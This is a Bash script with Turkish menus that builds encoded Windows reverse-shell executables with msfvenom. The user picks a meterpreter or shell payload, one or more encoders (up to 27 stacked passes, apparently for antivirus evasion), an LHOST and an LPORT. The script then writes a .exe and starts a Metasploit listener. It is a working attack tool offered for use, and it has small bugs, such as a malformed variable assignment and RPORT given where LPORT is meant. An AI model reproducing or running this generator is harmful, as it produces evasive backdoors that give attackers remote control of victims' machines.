#!/bin/bash

if [[ ! -d "$HOME/Hack-Tools/msf" ]];then
	echo "Kurulum yapılmamış...!"
	sleep 1 && exit
fi 
clear
while :
do	
	clear
	echo "=============================="
	echo
	echo "-Payload seçiniz:"
	echo "Seçili os: windows"
	echo ""
	echo "1- /meterpreter/reverse_http"
	echo "2- /meterpreter/reverse_tcp"
	echo "3- /meterpreter/reverse_https"
	echo "4- /shell/reverse_tcp_dns"
	echo
	echo "99- Çıkış"
	echo 
	echo "=============================="
	echo
	read -p "-İşlem->" pay_select
	
	if [[ "$pay_select" = "1" ]];then	
		pay_load="windows/meterpreter/reverse_http"
		echo "${pay_load}"
		
	elif [[ "$pay_select" = "2" ]];then
		pay_load="windows/meterpreter/reverse_tcp"
	elif [[ "$pay_select" = "3" ]];then
		pay_load="windows/meterpreter/reverse_https"
	elif [[ "$pay_select" = "4" ]];then
		pay_load="windows/shell/reverse_tcp_dns"
	elif [[ "$pay_select" = "99" ]];then
		echo "Çıkış yapılıyor...!"
		sleep 1 && break
	else
		echo
		echo "Bu alan boş bırakılamaz...!"
		echo && sleep 1
	fi #payloads kısmının fi si 
	clear
	echo "=============================="
	echo
	echo "Encode seçiniz:"
	echo "ön tanımlı: x86/shikata_ga_nai"
	echo ""
	echo "1- x86/xor_dynamic -normal"
	echo "2- x86/call4_dword_xor -normal"
	echo "3- x86/shikata_ga_nai -gayet iyi"
	echo "4- Multi encode 3 algoritma ile 9+12+6=27 kez encode"
	echo
	echo "99- İptal et & çıkış"
	echo
	echo "=============================="
	echo	
	read -p "-İşlem-> " encode_select
	multi_encode="0"
	if [[ "$encode_select" = "1" ]];then
		en_code="x86/xor_dynamic"
	elif [[ "$encode_select" = "2" ]];then
		en_code="x86/call4_dword_xor"
	elif [[ "$encode_select" = "3" ]];then
		en_code="x86/shikata_ga_nai"
		
	elif [[ "$encode_select" = "4" ]];then
		multi_encode="1"
		encode_pcs="27"
		en_code="Multi encode"
	elif [[ "$encode_select" = "99" ]];then
		echo "Çıkış yapılıyor...!"
		sleep 1 && break
	else
		echo 
		echo "Öntanımlı kullanılıyor...!"
		en_code="x86/shikata_ga_nai"
	
	fi
	
	if [[ "$multi_encode" = "0" ]];then
	
		clear
		echo "=============================="
		echo 
		echo "-Kaç kez encode edilecek?"
		echo "ön tanımlı:8"
		echo 
		echo "1- 1 kez (önerilmez)"
		echo "2- 5 kez"
		echo "3- 8 kez (standart)"
		echo "4- 16 kez"
		echo
		echo "99- İptal & çıkış"
		echo
		echo "=============================="
		echo 
		read -p "-İşlem-> " encode_slc
		
		if [[ "$encode_slc" = "1" ]];then
			encode_pcs="1"
		elif [[ "$encode_slc" = "2" ]];then
			encode_pcs="5"
		elif [[ "$encode_slc" = "3" ]];then
			encode_pcs="8"
		elif [[ "$encode_slc" = "4" ]];then
			encode_pcs="16"
	
		elif [[ "$encode_slc" = "99" ]];then
			echo "Çıkış yapılıyor...!"
			sleep 1 && break
		else 
			echo "Ön tanımlı kullanılıyor...!"
			encode_pcs="8"
		
		fi 
	
		#buradaki işlemler bu toolun kendi tmp dizininde yapılacaktır
		
	fi
	
	clear 
	
	echo "=============================="
	echo
	echo "-Çıktı formatını seçiniz:"
	echo "Öntanımlı: .exe"
	echo
	echo "1- .exe"
	#echo "2- .bat"
	echo
	echo "99- İptal & çıkış"
	echo
	echo "=============================="
	echo 
	read -p "-İşlem->" out_select
	
	if [[ "$out_select" = "1" ]];then
		out_format="exe"
	#elif [[ "$out_select" = "2" ]]
	#then
	#	out_format="bat"
	elif [[ "$out_select" = "99" ]];then
		echo "Çıkış yapılıyor...!"
		sleep 1 && break
	else 
		out_format="exe"
	fi 
	clear
	echo "=============================="
	echo 
	read -p "LHOST giriniz -> " lhost_ip
	echo 
	read -p "LPORT giriniz -> " lport_no
	echo
	read -p "Çıktı dosyasının adı -> " out_name
	echo
	echo "=============================="
	sleep 1
	clear
	echo "=============================="
	echo
	echo "Oluşturukuyor...!"
	echo "Özellikler:"
	echo 
	echo "Payload -> $pay_load"
	echo "Encoder tipi ve miktarı -> $en_code $encode_pcs kez encode edildi"
	echo "Dosya adı -> $out_name"
	echo "Çıktı formatı -> $out_format"
	echo "LHOST & LPORT -> $lhost_ip:$lport_no"
	echo
	echo "=============================="
	sleep 1
	if [[ "$multi_encode" = "0" ]];then
		msfvenom -p $pay_load -e $en_code -i $encode_pcs -a x86 --platform windows LHOST=$lhost_ip LPORT=$lport_no -f $out_format > $HOME/Hack-Tools/msf/$out_name.$out_format
	elif [[ "$multi_encode" = "1" ]];then
		if [[ -d "$HOME/Hack-Tools/tmp" ]];then
			rm -rf $HOME/Hack-Tools/tmp/* # olası bir tekrarlamada tmp deki dosyların hata vermesini engellemek için
		fi 
		msfvenom -p $pay_load -a x86 -e x86/shikata_ga_nai -i 9 --platform windows LHOST=$lhost_ip LPORT=$lport_no -f raw | msfvenom --platform windows -a x86 -e x86/xor_dynamic -i 12 -f raw | msfvenom --platform windows -a x86 -e x86/call4_dword_xor -i 6 -f $out_format -o $HOME/Hack-Tools/msf/$out_name.$out_format
		clear
		
			
		
	fi
	if [[ -e "$HOME/Hack-Tools/msf/$out_name.$out_format" ]];then
		$platform="windows"
		$tip="x86"
		#log kaydı ekleme noktası 
		touch $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		date >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "$lhost_ip:$lport_no" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		
		echo "$platform" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "$pay_load" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "$out_name.$out_format" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "Genereated: Yes" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "Type(x64_x86): $tip" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		echo "Multi encode (1 true - 0 no): $multi_encode" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		if [[ "$multi_encode" = "0" ]];then 
			echo "Encoder and pcs: $en_code & $encode_pcs" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		elif [[ "$multi_encode" = "1" ]];then
				
				echo "Multi encode info:" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
				echo "x86/shikata_ga_nai & 9" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
				echo "x86/xor_dynamic & 12" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
				echo "x86/call4_dword_xor & 6" >> $HOME/Hack-Tools/msf/generate-$out_format-$out_name.txt
		else 
			echo "error"
		fi 
		
		clear
		echo "=============================="
		echo 
		echo "$out_name.$out_format dosyanız $HOME/Hack-Tools/msf içerisine oluşturuldu...!"
		echo
		echo "=============================="
		echo
		read -p "Devam etmek için ENTER"
		clear
		echo "=============================="
		echo "Dinleyici başltılıyor...!"
		echo "=============================="
		msfconsole -q -x "use exploit/multi/handler ; set payload $pay_load; set LHOST $lhost_ip; set RPORT $lport_no; exploit ; exit"
	else 
		clear
		echo "Bilinmeyen hata...!"
		sleep 1 && break
	fi 
	
	
done 	










